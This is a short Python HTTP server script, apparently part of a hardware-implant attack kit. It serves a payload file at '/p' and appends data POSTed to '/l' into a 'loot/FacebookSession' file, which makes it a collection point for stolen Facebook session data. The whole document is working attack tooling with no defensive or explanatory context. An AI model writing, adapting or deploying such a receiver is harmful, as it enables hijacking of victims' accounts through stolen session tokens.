#!/usr/bin/python
from os import curdir
from os.path import join as pjoin

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
# from http.server import BaseHTTPRequestHandler, HTTPServer

class StoreHandler(BaseHTTPRequestHandler):
    store_path = pjoin("/root/udisk/loot/FacebookSession/", 'l')
    get_path = pjoin(curdir, 'p')

    def do_GET(self):
        if self.path == '/p':
            with open(self.get_path) as fh:
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(fh.read().encode())

    def do_POST(self):
        if self.path == '/l':
            length = self.headers['content-length']
            data = self.rfile.read(int(length))

            with open(self.store_path, 'a') as fh:
                fh.write(data.decode() + "\n")

            self.send_response(200)


server = HTTPServer(('', 8080), StoreHandler)
server.serve_forever()

